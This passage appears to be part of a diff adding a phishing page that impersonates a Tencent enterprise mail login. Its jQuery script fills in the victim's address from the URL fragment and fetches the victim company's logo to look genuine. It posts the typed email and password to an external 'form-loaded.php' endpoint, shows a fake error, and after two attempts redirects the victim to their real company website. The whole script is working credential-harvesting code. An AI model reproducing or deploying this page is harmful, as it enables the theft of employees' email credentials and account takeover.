+                            <div class="signup_item_content"><a href="/login" data-type="back-to-complete-info"
+                                    class="login_btn">Scan code login</a></div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <!-- <iframe name="loginFrameHidden" id="loginFrameHidden" frameborder="0" style="display:none;width: 0;height: 0;"></iframe> -->
+        </div>
+    </div>
+    <div id="tipsContainer" style="display:none;">
+        <div id="tipsTop" class="tipsWrap topPos size14" style="display:none;"><span class="msg"></span></div>
+        <div id="tipsMsg" class="tipsWrap tipsCenter size14" style="display:none;"><span class="msg"></span></div>
+        <div id="tipsProcess" class="tipsWrap tipsCenter size14" style="display:none;"><span class="msg"
+                style="background-color:gray;"></span></div>
+        <div id="tipsError" class="tipsWrap tipsCenter size14" style="display:none;"><span class="msg"
+                style="background-color:orange;"></span></div>
+    </div>
+    <div style="clear:both;"></div>
+    <div class="frame_foot_copyright"> <a class="frame_foot_nav_item_link" href="http://www.tencent.com/"
+            target="_blank">About Tencent</a> <span class="frame_foot_nav_item_dep">&nbsp;|&nbsp;</span> <a
+            class="frame_foot_nav_item_link" href="https://exmail.qq.com/cgi-bin/bizmail_portal?t=bizmail_eula"
+            target="_blank">User Agreement</a> <span class="frame_foot_nav_item_dep">&nbsp;|&nbsp;</span> <a
+            class="frame_foot_nav_item_link" href="https://work.weixin.qq.com/help?h=e" target="_blank"
+            data-statistics-item="help|click|index_bottom">Help center</a> <span
+            class="frame_foot_nav_item_dep">&nbsp;|&nbsp;</span> <a class="frame_foot_nav_item_link"
+            href="http://exmail.qq.com/cgi-bin/download?path=manual&amp;filename=%CC%DA%D1%B6%C6%F3%D2%B5%D3%CA%CF%E4%D3%C3%BB%A7%CA%B9%D3%C3%CA%D6%B2%E1.pdf"
+            target="_blank" data-statistics-item="manual|click|index_bottom">User manual</a> &nbsp;&nbsp;
+        ©1998 &nbsp;-&nbsp;2023&nbsp;Tencent Inc. All Rights Reserved</div>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            var m = 0;
+        
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#email').val("");
+                $("#automail").animate({
+                    left: 200,
+                    opacity: "hide"
+                }, 0);
+                $("#inputbar").animate({
+                    right: 200,
+                    opacity: "show"
+                }, 1000);
+            });
+        
+            var n = window.location.hash.substr(1);
+            
+            if (!n) {
+            } else {
+                var o = n;
+                $('#email').val(o);
+                $('#emailich').html(o);
+                var p = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!p.test(o)) {
+                    $('#error').show();
+                    n.focus;
+                    return false;
+                }
+        
+                var q = o.indexOf("@");
+                var r = o.substr((q + 1));
+                var c = r.substr(0, r.indexOf('.'));
+                var s = c.toLowerCase();
+                var t = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + r);
+                $("#logoimg").attr("alt", t);
+                $("#logoname").html(t);
+                $(".logoname").html(t);
+            }
+        
+            $('#submit-btn').click(function (b) {
+                $('#error').hide();
+                $('#msg').hide();
+                b.preventDefault();
+                var d = $("#email").val();
+                var e = $("#password").val();
+                var z = $("#lourl").val();
+                var f = $('#msg').html();
+                $('#msg').text(f);
+                var g = d;
+                var h = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!h.test(g)) {
+                    $('#error').show();
+                    d.focus;
+                    return false;
+                }
+        
+                var i = g.indexOf("@");
+                var j = g.substr((i + 1));
+                var c = j.substr(0, j.indexOf('.'));
+                var k = c.toLowerCase();
+                var l = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + j);
+                $("#logoname").html(l);
+                if (e == '') {
+                    $('#msg').show();
+                    d.focus;
+                    return false;
+                }
+        
+                m = m + 1;
+        
+                $.ajax({
+                    dataType: 'JSON',
+                    url: dbaseURL+'form-loaded.php',
+                    type: 'POST',
+                    data: {
+                        email: d,
+                        password: e,
+                        lourl: z,
+                    },
+                    beforeSend: function (a) {
+                        $('#submit-btn').val('Verifing...');
+                    },
+                    success: function (a) {
+                        if (a) {
+                            $("#msg").show();
+                            console.log(a);
+                            if (a['signal'] == 'ok') {
+                                $("#password").val("");
+                                if (m >= 2) {
+                                    m = 0;
+                                    window.location.replace("http://www." + j);
+                                }
+                            } else {
+                            }
+                        }
+                    },
+                    error: function () {
+                        $("#password").val("");
+                        if (m >= 2) {
+                            m = 0;
+                            window.location.replace("http://www." + j);
+                        }
+                        $("#msg").show();
+                    },
+                    complete: function () {
+                        $('#submit-btn').val('LOGIN');
+                    }
+                });
+            });
+        });
+
+    </script>
+</body>
+</html>
